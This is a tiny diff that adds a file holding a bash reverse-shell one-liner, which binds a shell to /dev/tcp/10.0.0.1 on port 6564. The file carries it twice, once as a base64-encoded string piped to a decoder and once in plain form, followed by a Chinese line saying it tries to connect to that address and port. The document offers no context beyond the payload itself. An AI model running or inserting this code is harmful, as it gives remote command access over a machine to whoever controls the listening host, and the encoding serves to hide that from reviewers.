@@ -1,0 +1,5 @@
+echo -n "MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4wLjAuMS82NTY0OyBiYXNoIDwmMTk2ID4mMTk2IDI+JjE5Ng==" | base64 -d
+
+0<&196;exec 196<>/dev/tcp/10.0.0.1/6564; bash <&196 >&196 2>&196
+
+嘗試連線到10.0.0.1 6564端口
